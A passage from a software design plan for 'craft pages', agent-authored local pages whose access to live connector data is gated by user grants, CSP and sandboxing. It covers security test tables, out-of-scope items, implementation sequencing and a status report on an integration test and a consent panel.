| Self-navigation, external browser | not blocked → live-data pages must be in-app only |

**Grants (WS7)**

| Test | Expected |
|---|---|
| Hand-edited `page.json` adding a query | no new access |
| Grant naming a tool absent from the trusted allowlist | rejected at approval **and** execution |
| Runtime param colliding with a `fixedArgs` key | rejected; `fixedArgs` wins |
| Param violating `paramSchema` | rejected, opaque error |
| Upstream connector 401 | opaque code to page; detail server-side only |
| Restyle a page, no query change | **no** re-prompt (`approvedQuerySetHash` unchanged) |
| Source removed / re-authenticated | grants invalidated |
| "Open in browser" on a grant-holding page | disabled with an explanation |
| Concurrent page creation from two sessions | no lost catalog entries |
| Flag off | listener unbound, tool absent, channel unregistered |

**Platform** (macOS arm64/x64, Windows x64, Linux x64): first run with no firewall prompt; renders
in-app and in the default browser; corporate proxy; long slug near `MAX_PATH`; cold-start after
restart; MCP subprocess cleanup on quit; upgrade from a real v0.11.x install.

---

## 9. Out of scope for v1

- **Live-data pages in a third-party browser** — §2.5. Structurally unsafe; not a backlog item until
  browsers ship a navigation-restriction primitive.
- **Thin-client / remote workspaces.** A page on the *remote* machine's loopback cannot open in the
  *thin client's* browser, and exposing it needs an authenticated remote delivery model with a
  different threat model. Detect and surface a clear message rather than failing obscurely.
- Form submission; write / side-effecting connector calls (locked decisions).
- Pages as durable workspace objects, a page library, or a top-level navigator. A navigator is a
  6-file change with two silent-failure modes: `route-parser.ts` maintains **two** parallel route
  representations needing edits in all three conversion directions, and every channel must be
  classified in `routing.ts`.
- Version history UI. The store is already revisioned (§2.3), so surfacing a version dropdown is
  cheap — but the retention policy, restore RPC, and UI are v1.1.
- LAN / phone access (binding beyond loopback → Windows inbound firewall prompt).
- Remote publishing. `SessionManager.shareToViewer` uploads to `https://agents.craft.do/s/api`, but
  that backend isn't in this repo and it contradicts the local-only framing. Export-to-folder/zip is
  the better shape.

---

## 10. Sequencing

| Step | Content | Gate |
|---|---|---|
| 0 | Repair CI — restore the six scripts for real | `validate:ci` green |
| 1 | **WS0** ADR + spike | Every exit criterion passes in 3 browsers × 3 platforms; self-navigation finding confirmed |
| 2 | **WS1** store, revisions, `PageCatalogService`, tool | Multi-file page, zero prompts, `expectedRev` conflicts handled, no lost catalog entries under concurrency |
| 3 | **WS2 + WS3** server, containment, HTTP boundary, partition, egress, CSP | Serving/containment + sandbox test tables pass |
| 4 | **WS4** cold-start + open-in-browser | Weeks-old page in an unloaded session opens after restart |
| 5 | **WS5** compact card, fullscreen, revisioned refresh | Iteration is visibly instant incl. CSS/JS; N edits ≠ N live frames |
| 6 | **WS6** deletion dialog, flag gating, i18n, packaging, platform E2E | Phase 1 ships behind `FEATURE_FLAGS.craftPages` |
| 7 | **WS7** allowlist, grant store, bridge, pool, wrapper chrome | ✅ implemented — see docs/adr/0001 |

### Status

Steps 0–7 are implemented behind `FEATURE_FLAGS.craftPages`, with ~350 tests
across five packages and `validate:ci` green.

A full-stack integration test (`pages/__tests__/integration.test.ts`) was
added after WS7 and immediately found that live data was **not connected**:
the grant store, bridge and pool were all built and tested, but the wrapper
still answered every query with `live_data_unavailable`. Nothing caught it
because every test entered at the bridge — which is where the *wrapper*
enters, not where a *page* does. A page cannot reach `/internal/query`
itself (CSP `connect-src 'none'`, and its opaque origin fails the Origin
pin), so the real first hop is a postMessage into the wrapper, and that hop
had no tests at all. It is now implemented and covered from both sides.

The whole path was then verified in Chrome against a live listener: real
connector data rendered in the sandboxed frame, an ungranted query returned
`forbidden`, a direct `fetch('/internal/query')` from the page was blocked
by CSP, the frame reported `origin=null` with `localStorage` and
`document.cookie` both blocked, and a top-level navigation to a
grant-holding page was refused. Exactly one connector call was made, with
the page's parameter merged onto the user's fixed argument.

What remains:

- **Windows and Linux verification.** Unchanged and still the largest
  carried risk; see below.

### The request path (built after the integration test found it missing)

An audit against the code found that everything *behind* an approved grant
existed and nothing in front of it did. All three pieces are now built,
test-first, and the whole path is verified in Chrome:

1. **`craft_page` takes `queries`** — the agent REQUESTS live data, and the
   request lands on the manifest for the user to decide. Validation runs
   before any write, so a rejected request leaves no page behind.
2. **`craftQuery`** — served at `/w-assets/craft-query.js`, with the *page's*
   CORP rather than the wrapper's, because the sandboxed page is cross-origin
   to the server. The skill and the flag-gated prompt section both teach it.
3. **The consent panel** — `CraftPageConsent`, with every rule in a pure,
   mutation-tested module. It cannot approve a row it did not display, and
   it shows requests it cannot honour rather than dropping them.

Grants resolve by the page's own **handle**, not by id: an agent cannot know
a grant id while authoring, and a page that could pass a raw id could try
ids it was never given. Handles are page-scoped.

`FEATURE_FLAGS.craftPagesLiveData` now exists as this plan always specified,
as a sub-flag of `craftPages`. With it off the runtime builds no grant store,
no pool and no bridge, so `/internal/query` is absent rather than merely
unauthorised, and no page becomes framed-only.
- **Windows and Linux verification.** The naming rules are pure-string and
  tested from any OS, but the filesystem containment guard has never run on
  Windows. This is the largest carried risk.
- **Gecko.** Deferred by decision; the spike's instrumentation runs there
  unchanged when wanted.

The authoring skill and prompt guidance are written alongside WS5–WS6, once the real constraints are
verified — no `localStorage`, no `<form>` submit, external `app.js` only, no inline scripts, data as
JS not fetched JSON, and inline styles permitted or not per the WS0 decision. Writing it earlier would
teach the model patterns the sandbox rejects.
